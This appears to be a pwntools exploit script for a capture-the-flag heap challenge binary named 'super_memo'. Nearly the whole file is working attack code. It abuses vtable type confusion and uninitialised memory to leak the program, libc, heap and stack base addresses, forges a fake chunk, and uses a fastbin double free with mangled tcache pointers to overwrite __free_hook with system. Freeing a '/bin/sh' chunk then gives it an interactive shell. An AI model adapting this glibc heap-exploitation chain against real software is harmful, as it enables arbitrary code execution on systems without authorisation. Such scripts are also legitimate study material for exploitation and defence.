from pwn import *
import re

context.arch = 'amd64'
context.terminal = ['konsole', '-e']

elf = ELF("./super_memo")
libc = ELF("/usr/lib/libc.so.6")
proc = process("./super_memo", aslr=True)

def exit():
    proc.sendlineafter("do:", str(0));

def add_page(kind):
    proc.sendlineafter("do:", str(1));
    proc.sendlineafter("kind:", str(kind))

def add_memo_select(page_index):
    proc.sendlineafter("do:", str(2));
    proc.sendlineafter("index: ", str(page_index));
def add_base(page_index, value):
    add_memo_select(page_index)
    proc.sendlineafter("add? :", str(value))
def add_sum(page_index, value):
    add_base(page_index, value)
def add_str(page_index, message):
    add_memo_select(page_index)
    proc.sendlineafter("contents: ", message)

def edit_memo_select(page_index):
    proc.sendlineafter("do:", str(3));
    proc.sendlineafter("index: ", str(page_index));
def edit_base(page_index, memo_index, value):
    edit_memo_select(page_index)
    proc.sendlineafter("index: ", str(memo_index))
    proc.sendlineafter("value: ", str(value))
def edit_sum(page_index, memo_index, value):
    edit_base(page_index, memo_index, value)

def show_all_pages():
    proc.sendlineafter("do:", str(4));

def debug(page):
    proc.sendlineafter("do:", str(5));
    proc.sendlineafter("index: ", str(page));
    test_result = proc.recvuntil('\n')[:-1]

    if test_result == b'test passed':
        log.info(f'page: {page}, test passed');
        return (True, 0);
    
    fail_info = [int(v) for v in re.findall('([+-]?[0-9]+)', test_result.decode())]

    if len(fail_info) != 2:
        log.error("test result corrupt")
        quit()
    if fail_info[0] != -1:
        log.error("expected number is not -1")
        quit()

    return (False, fail_info[1])
def delete(page):
    proc.sendlineafter("do:", str(6))
    proc.sendlineafter("index: ", str(page))


non_aslr_address = {
        "sum_vtable": 0x55555555bc30,
        "str_vtable": 0x55555555bbc0,
        "file_base": 0x0000555555554000,
        "str_show": 0x555555556cb8,
        "str_edit": 0x555555556bcc,
        "str_add": 0x555555556b68,
        "prod_show": 0x555555556b68,
        "sum_show": 0x555555556a70,
        "base_edit": 0x555555556878,
        "base_add": 0x555555556926,
        }
non_aslr_libc_address = {
        "unsortedbin_leak_addr": 0x1555551b9e90,
        "libc_code_base": 0x0000155554ff7000,
        "stack_pointer": 0x1555551ba2c0,
        "libc_write_base": 0x0000155554ff3000,
        "__free_hook": 0x1555551bcca0,
        }
non_aslr_heap_address = {
        "heap_base": 0x000055555555d000,
        "leak_addr": 0x555555570820,
        "double_free_fastbin": 0x555555570bf0,
        "double_free_allocate_address": 0x555555570a10,
        "tcache_counter": 0x55555555d010,
        }
non_aslr_stack_address = {
        "stack_base": 0x00007ffffffde000,
        "leak_addr": 0x7fffffffea4f,
        }

offsets = dict([
        (key, addr - non_aslr_address["file_base"]) for (key, addr) in non_aslr_address.items()
        ])
libc_offsets = dict([
        (key, addr - non_aslr_libc_address["libc_code_base"]) for (key, addr) in non_aslr_libc_address.items()])
heap_offsets = dict([
        (key, addr - non_aslr_heap_address["heap_base"]) for (key, addr) in non_aslr_heap_address.items()])
stack_offsets = dict([
        (key, addr - non_aslr_stack_address["stack_base"]) for (key, addr) in non_aslr_stack_address.items()])

for k, v in offsets.items():
    log.info(f'registerd file offset of {k}: {hex(v)}')
for k, v in libc_offsets.items():
    log.info(f'registerd libc offset of {k}: {hex(v)}')
for k, v in heap_offsets.items():
    log.info(f'registerd heap offset of {k}: {hex(v)}')
for k, v in stack_offsets.items():
    log.info(f'registerd stack offset of {k}: {hex(v)}')


add_page(1) # add sum
for i in range(10):
    add_sum(0, i) 
test_ret, val = debug(0)
if test_ret:
    log.error("test passed")

sum_vtable = val
log.success(f'got SumMemo vtable address: {hex(sum_vtable)}')

file_base = sum_vtable - offsets["sum_vtable"]
log.success(f'got file base address: {hex(file_base)}')

str_to_sum_payload = \
    pack(file_base + offsets["sum_show"]) + \
    pack(file_base + offsets["base_edit"]) + \
    pack(file_base + offsets["base_add"])
sum_to_str_payload = file_base + offsets["str_vtable"]

# leak libc
log.info('start leaking libc base')

## make space
for i in range(50): 
    add_page(2)

## create sum memo
add_page(3)
for i in range(0, 9):
    add_str(51, f'leaklibc-state1-{i}')
add_str(51, pack(0) + pack(0x501))
add_str(51, str_to_sum_payload)

## create fake chunk
for i in range(0, 9):
    edit_sum(51, i, 0)
edit_sum(51, 0, 0x10) # offset of fake chunk
show_all_pages() # all
edit_sum(51, 9, 0)
add_sum(51, sum_to_str_payload)

## bypass unsortedbin checks
for i in range(12):
    add_page(2)
add_page(1)
add_sum(64, 0)
add_sum(64, 0)
add_sum(64, 1)
add_sum(64, 0)
add_sum(64, 0x21) # prev_inuse
add_sum(64, 0)
add_sum(64, 0)
add_sum(64, 0)
add_sum(64, 0x21) # prev_inuse

## make unsortedbin chunk
delete(51)

for i in range(8):
    delete(51)

for i in range(50):
    delete(1)

## extract libc address
add_page(3) # 6
add_str(6, 'x' * 7)
show_all_pages()
proc.recvuntil('x\n')
leaked_libc = int.from_bytes(proc.recvuntil('what')[:-5], 'little')

## calc libc base
libc_base = leaked_libc - libc_offsets["unsortedbin_leak_addr"]

log.success(f'libc base is {hex(libc_base)}')

delete(6)

# leak heap
log.info('start leaking heap base')

## malloc and leak heap
add_page(3) # 6
add_str(6, 'y' * 15)

## dump uninit memory
show_all_pages()

## extract heap
proc.recvuntil('y\n')
leaked_heap = int.from_bytes(proc.recvuntil('\n')[:-1], 'little')

## calc heap base
heap_base = leaked_heap - heap_offsets["leak_addr"]

## clear tmp page
delete(6)

log.success(f'heap base is {hex(heap_base)}') 
# leak stack
log.info(f'start leaking stack base')

##  make pointer
add_page(2) # 6
for i in range(10):
    add_sum(6, libc_base + libc_offsets["stack_pointer"])
add_sum(6, sum_to_str_payload)

## dump stack pointer
show_all_pages()

## extract stack
proc.recvuntil('product: 0\nsum')
proc.recvuntil('\n')
leaked_stack = int.from_bytes(proc.recvuntil('\n')[:-1], 'little')

## delete tmp

add_str(6, str_to_sum_payload)
delete(6)

## calc stack base
stack_base = leaked_stack - stack_offsets["leak_addr"]

log.success(f'stack base is {hex(stack_base)}')

# create memo at stack
log.info(f'create chunk at stack')

## slide page
for i in range(9):
    add_page(2)

## remove tcache and fastbin

add_page(3) # 15
for i in range(10):
    add_str(15, b'remove tcache fastbin')

## fill pointer
add_page(3) # 16

for i in range(10):
    add_str(16, 'stack chunk')
add_str(16, str_to_sum_payload)

## fill tcache. double-free fastbin
'''
5544| 0x555555570458 --> 0x61 ('a')
5552| 0x555555570460 --> 0x555555570c20 --> 0x555555556a70 (<SumMemo::show()>:      push   rbp)
5560| 0x555555570468 --> 0x555555570a40 ("stack chunk\nU\025") 0: tcache
5568| 0x555555570470 --> 0x555555570a70 ("stack chunk\nU\025") 1: tcache
5576| 0x555555570478 --> 0x555555570aa0 ("stack chunk\nU\025") 2: tcache
5584| 0x555555570480 --> 0x555555570ad0 ("stack chunk\nU\025") 3: tcache
5592| 0x555555570488 --> 0x555555570b00 ("stack chunk\nU\025") 4: tcache
5600| 0x555555570490 --> 0x555555570b30 ("stack chunk\nU\025") 5: tcache
5608| 0x555555570498 --> 0x555555570b60 ("stack chunk\nU\025") 6: tcache
5616| 0x5555555704a0 --> 0x555555570b90 ("stack chunk\nU\025") fastbin-1
5624| 0x5555555704a8 --> 0x555555570bc0 ("stack chunk\nU\025") fastbin-2
5632| 0x5555555704b0 --> 0x555555570bf0 ("stack chunk\nU\025") fastbin-1
5640| 0x5555555704b8 --> 0x61 ('a')
5648| 0x5555555704c0 --> 0x555000025050 
'''


edit_sum(16, 7, heap_base + heap_offsets["double_free_fastbin"]) # 0x555555570bf0
add_sum(16, sum_to_str_payload)

delete(16)

## realloc. double-free
dest = libc_base + libc_offsets["__free_hook"]
write_pointer = dest ^ ((heap_base + heap_offsets["double_free_allocate_address"]) >> 12)

add_page(3) # 16
for i in range(7): # alloc from tcache
    add_str(16, 'from tcache')

add_str(16,  # fastbin-1
        pack(write_pointer) + 
        pack(heap_base + heap_offsets["tcache_counter"])
        )
add_str(16, 'tcache_padding') # fastbin-2
add_str(16, '/bin/sh\0')

## write to __free_hook
add_page(3) # 17
add_str(17, pack(libc_base + libc.symbols["system"]))

delete(16)

'''
7000| 0x555555570a08 --> 0x31 ('1')
7008| 0x555555570a10 ("will fastbin\n\025")
7016| 0x555555570a18 --> 0x150a6e696274 
'''

# delete(15)


# gdb.attach(proc)
proc.interactive()

quit()


